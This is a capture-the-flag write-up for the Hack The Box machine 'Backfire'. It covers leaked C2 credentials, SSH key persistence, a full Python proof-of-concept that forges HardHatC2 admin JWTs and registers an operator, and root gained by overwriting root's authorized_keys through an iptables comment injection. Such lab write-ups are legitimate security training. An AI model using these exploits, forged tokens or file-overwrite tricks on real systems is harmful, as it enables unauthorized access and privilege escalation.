---
title: Backfire
date: 2025-01-28
description: Exploited exposed Havoc C2 configuration files to gain access as ilya through an SSRF-to-RCE chain, pivoted into HardHatC2 using an authentication bypass, compromised sergej through the operator console, and escalated to root via an iptables-save overwrite technique.
tags:
  - htb
  - medium
  - Linux
---

# Initial Recon

```bash
nmap -p22,443,8000 -sV -sC -O -oX fullscan.xml -oN fullscan.txt 10.10.11.49
```

Port `8000` stood out immediately since it exposed downloadable files:

- `disable_tls.patch`
- `havoc.yaotl`

The `havoc.yaotl` file leaked operator credentials for two users:

```txt
Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}
```

---

# User

## Havoc

The leaked configuration belonged to the Havoc C2 framework. Naturally, someone left the keys on the table. Cute.

> While searching for related vulnerabilities, this SSRF-to-RCE exploit surfaced:
> https://github.com/HimmeL-Byte/CVE-2024-41570-SSRF-RCE

The exploit included:

- `payload.sh`
- `exploit.py`

The included `README` provided clear usage instructions. Before execution, replace the attacker IP inside both scripts.

The exploit landed an unstable shell as `ilya`. To stabilize access, an SSH public key was appended into `~/.ssh/authorized_keys`.

Generated a new RSA key pair:

```bash
ssh-keygen -t rsa -b 4096 -C "ilya@backfire.htb"
```

Injected the public key:

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOcmUVdcrzeWaR2Vf2vaheiOwTyCFFy5OVp9+Fk1eJQn9cd/qUZ23mr4fJfjhIjhzjZK9LRDjzM43bQtmThk/bO/RcRZYkB4TZrFE4G6SZypB0VQ6pju2DEx0zYRzalZrSvzXr47gNuc/LKCJUqoIWWesLeU54li/5AgnvmGwUagAoVQu5Qcel8utmShYiVh95k5M4mb+/bE+XPHsqCktm7XRYaM9EalgXN73XT9NCwxpX9qw9axcCRVzWUARzjsWftVRSevQibto2hUMxNLhFVIjj3V6koA5S8kGObalv+xGuz7JbFsKz5iaQ2UhfiAmmF2u5bCyZfDS2sfg+oO65 ilya@backfire.htb" > ~/.ssh/authorized_keys
```

Connected over SSH:

```bash
ssh -i id_rsa ilya@backfire.htb
```

---

## HardHatC2

A `hardhat.txt` note hinted at another C2 deployment:

```txt
Sergej said he installed HardHatC2 for testing and not made any changes to the defaults
I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C#
```

That confirmed `sergej` had deployed HardHatC2 with default settings intact. Never underestimate default configs doing half the job for you.

> Further research led to the following write-up:
> https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7

Checking active listeners revealed ports tied to HardHatC2:

- `5000`
- `7096`

The target was vulnerable to an authentication bypass allowing forged administrator JWT tokens.

The proof-of-concept script generated a valid admin token and created a new operator account:

```python
# @author Siam Thanat Hack Co., Ltd. (STH)
import jwt
import datetime
import uuid
import requests

rhost = 'hardhatc2.local:5000'

secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
   "sub": "HardHat_Admin",
   "jti": str(uuid.uuid4()),
   "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
   "iss": issuer,
   "aud": issuer,
   "iat": int(now.timestamp()),
   "exp": int(expiration.timestamp()),
   "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "sth_pentest",
  "role": "TeamLead",
  "username": "sth_pentest"
}

r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```

Before running the exploit, the HardHatC2 ports were forwarded locally:

```bash
ssh -i id_rsa -L 7096:localhost:7096 -L 5000:localhost:5000 ilya@backfire.htb
```

Running the exploit generated the following credentials:

```txt
sth_pentest : sth_pentest
```

Navigated to:

`https://hardhatc2.localhost:7096/ImplantInteract`

After authenticating, the operator console exposed an interactive terminal running as `sergej`.

A new SSH public key was added to `sergej`'s `authorized_keys`, mirroring the earlier persistence method used for `ilya`.

Logged in through SSH as `sergej`.

---

# Root

## Privilege Escalation

Enumerated sudo permissions:

```bash
sudo -l
```

```txt
root user may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/iptables
    (ALL) NOPASSWD: /usr/bin/iptables-save
```

---

# iptables

> Researching `iptables` privilege escalation techniques led to:
> https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/

The technique abuses `iptables-save` to overwrite arbitrary files by embedding attacker-controlled content into firewall comments.

> The machine periodically reset firewall rules, so execution had to be done quickly before the rules reverted.

Generated an ED25519 key pair:

```bash
ssh-keygen -t ed25519
```

Using Bash `$'...'` quoting allowed newline injection into the iptables comment field:

```bash
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM5l0w8xGTH8eNKAdAD1w7SY5UGHNGsvi6DjH1bulO69 root@kali\n'
```

Verified the injected rule:

```bash
sudo iptables -S
sudo iptables -L
```

Overwrote root's SSH authorized keys file using `iptables-save`:

```bash
sudo iptables-save -f /root/.ssh/authorized_keys
```

> Attempted overwriting `/etc/shadow` with an OpenSSL-generated password hash, but write permissions blocked the operation.

Logged in as `root` over SSH.

Gained `Root`
